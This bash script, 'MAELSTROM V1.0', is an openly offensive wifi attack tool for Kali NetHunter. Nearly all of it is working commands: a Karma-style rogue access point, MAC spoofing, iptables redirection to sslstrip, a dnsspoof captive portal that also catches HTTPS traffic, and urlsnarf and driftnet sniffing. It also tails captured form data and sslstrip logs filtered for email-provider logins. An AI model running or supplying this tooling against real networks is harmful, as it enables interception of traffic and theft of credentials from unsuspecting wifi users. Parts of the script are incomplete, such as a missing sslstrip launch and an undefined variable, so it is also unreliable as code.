#!/bin/bash

#	author : armaal
#	written in : bash
#	date : june 2015
#	info : wifi attack vectors for nethunter (kali linux 1.1.0a)

f_interface(){

clear

echo -e "\e[93mMAELSTROM V1.0\e[0m"
echo
echo  "Chose Your Flavor [1-9]: "
echo
echo -e "\e[96m1. Perform FakeAP\e[0m"
echo "--------------------------------"
echo "2. Option accespoint-soft "
echo "3. Option accespoint-ssl "
echo "4. Option accespoint-captive-portal  "
echo "--------------------------------"
echo "5. Perform urlsnarf  "
echo "6. Perform driftnet "
echo "--------------------------------"
echo "7. Perform tails dhcp "
echo "8. Perform tails sslstrip "
echo "9. Perform tails Captive Portal "
echo
read -p "Choice: " interfacechoice

echo

  case $interfacechoice in
    	1) f_evilap ;;
	2) f_accespoint-soft ;;
	3) f_accespoint-ssl ;;
	4) f_accespoint-dnspoof-captive ;;
    	5) f_urlsnarf ;;
	6) f_driftnet;;
	7) f_dhcp;;
	8) f_ssl;;
	9) f_captive ;;
  esac
}

echo

#evilap
clear
echo
f_evilap(){

echo "kill all previous screen sessions" 
pkill -15 screen #kill all previous screen sessions
screen -wipe #remove dead screen

sleep 2s

airmon-ng stop wlan1mon
sleep 2s
airmon-ng start wlan1 #turn wlan1 into monitor mod
clear

#airbase-ng
echo -e "\e[96mYour fake AP will respond to all probe request around you\e[0m"
echo "----------------------------------------"
echo -e "\e[93mChose the fakeAP channel [1-13]\e[0m"
echo -e "\e[93mChose the fakeAP name\e[0m"
echo
read -p "Enter the fakeAP channel [1-13] : " channel
read -p "Enter the fakeAP name [ESSID] : " essid
clear
echo
echo -e "\e[96mGNU screen session created --> karma\e[0m"
echo -e "\e[96mscreen -x karma to enter into the screen session\e[0m"
sleep 1s
screen -dmS karma airbase-ng -P -C 60 -y -e $essid -c $channel -v wlan1mon 
}

#option acces-point soft
f_accespoint-soft(){
#cleanning iptable
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

#start to set rules on iptable based on the dhcpd.conf
ifconfig at0 up
ifconfig at0 192.168.7.1 netmask 255.255.255.0
route add -net 192.168.7.0 netmask 255.255.255.0 gw 192.168.7.1
pkill dhcpd #kill previous dhcp daemon

#change mac address on at0
echo -e "\e[35mChange your mac adress on at0\e[0m"
macchanger -r at0

echo -e "\e[35mYour new local mac adress on at0:\e[0m"
hn=`ifconfig at0 |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
hostname $hn
echo $hn
sleep 3s

#start the dhcp server
/etc/init.d/isc-dhcp-server start

#active router mod and configure some iptable
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
}
#option acces-point ssl
f_accespoint-ssl (){
#cleanning iptable
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

#start to set rules on iptables based on the dhcpd.conf
ifconfig at0 up
ifconfig at0 192.168.7.1 netmask 255.255.255.0
route add -net 192.168.7.0 netmask 255.255.255.0 gw 192.168.7.1
pkill dhcpd
/etc/init.d/isc-dhcp-server start

#iptable rules for ssltrip to 8888 port listener
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888

#launch ssltrip with log
echo
echo -e "\e[34mLogs saved to /sdcard/capture/ssl/\e[0m"
logfile=/sdcard/capture/ssl/sslstrip_$(date +%F-%H%M).log
echo
echo -e "\e[35m*When you have finish the sslstrip (ctrl-C to escape)\e[0m"
}

#option acces-point captive portal
f_accespoint-dnspoof-captive(){
#cleanning iptable
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

#start to set rules on iptables based on the dhcpd.conf
ifconfig at0 up
ifconfig at0 192.168.7.1 netmask 255.255.255.0
route add -net 192.168.7.0 netmask 255.255.255.0 gw 192.168.7.1

#iptable rules
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT

#put the wlan0 ip
echo -e "\e[34myour ip\e[0m"
ifconfig wlan0 | grep "inet " | awk -F'[: ]+' '{ print $4 }'
echo
read -p "Enter your ip ->" iplocal
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $iplocal:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $iplocal:80
iptables -t nat -A POSTROUTING -j MASQUERADE
pkill dhcpd
echo -e "\e[31mDHCP-server start\e[0m"
/etc/init.d/isc-dhcp-server start
sleep 2s
service apache2 restart
sleep 1s
echo -e "\e[31mdnsspoof launched\e[0m"
echo -e "\e[96mGNU screen session created --> dnsspoof e[0m"
echo -e "\e[96mscreen -x dnsspoof to enter into the screen\e[0m"
sleep 5s
screen -dmS dnsspoof dnsspoof -i at0 -f /usr/local/hosts
}

#driftnet
clear
echo
f_driftnet(){
	
   echo -e "\e[93mdriftnet with verbose\e[0m"
   driftnet -v -i at0
}

#urlsnarf
clear
echo
f_urlsnarf(){

   echo -e "\e[93mLogs saved to /sdcard/capture/urlsnarf/\e[0m"
   urlsnarf -i at0 >> /sdcard/capture/urlsnarf/urlsnarf_$(date +%F-%H%M).log
}

#tail captive portal
echo
f_captive(){
clear
echo -e " \e[44mCaptive Portal Tail\e[0m"
tail -f /var/www/"$wwwdir"/"formdata.txt"
}

#tail dhcp lease
echo
f_dhcp(){
clear
echo -e " \e[44mDHCP Tail Lease\e[0m"

#cleanning any pre-existing dhcp lease
echo > /var/lib/dhcp/dhcpd.leases
cat /dev/null > /tmp/dhcpd.conf
sleep 1s
tail -f /var/lib/dhcp/dhcpd.leases 2> /dev/null | grep --color -E "lease|hardware|client"
}

#tail ssltrip log
echo
f_ssl(){
clear
echo -e " \e[44mSSL Tail filtering mail extension\e[0m"
echo
tail -f /opt/maelstrom/ssllog.txt | grep -E 'orange.fr|gmail.com|free.fr|hotmail.fr|hotmail.com'
}

#run interface
f_run(){
  f_interface 
  }
f_run
